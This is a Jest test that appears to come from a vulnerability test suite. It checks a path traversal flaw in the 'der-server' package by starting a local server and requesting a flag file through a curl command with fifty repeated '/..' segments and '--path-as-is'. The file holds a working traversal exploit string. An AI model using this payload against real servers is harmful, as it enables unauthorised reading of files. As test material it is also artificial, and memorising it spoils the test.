const path = require('path');
const pathToFlag = path.resolve(__dirname, '../flag.html');
const genstr = function (n) {
    const v41 = '/..'.repeat(50);
    const v42 = v41 + pathToFlag;
    return v42;
};
const v55 = done => {
    const v43 = expect.assertions(1);
    v43;
    var pkg = require('der-server');
    const fs = require('fs');
    const v44 = require('child_process');
    const exec = v44.exec;
    const v45 = fs.readFileSync(pathToFlag);
    let hostsFile = v45.toString();
    const a = require('child_process');
    try {
        const v46 = () => {
        };
        const v47 = a.execSync('fuser -k 8887/tcp', v46);
        v47;
    } catch (e) {
    }
    const v48 = pkg.start(__dirname, '../flag.html', 8887);
    v48;
    const v49 = genstr();
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8887${ v49 }"`;
    const v53 = (error, stdout) => {
        const v50 = expect(stdout);
        const v51 = v50.toBe(hostsFile);
        v51;
        const v52 = done();
        v52;
    };
    const v54 = exec(attack_string, v53);
    v54;
};
const v56 = test('Path Traversal in der-server', v55);
v56;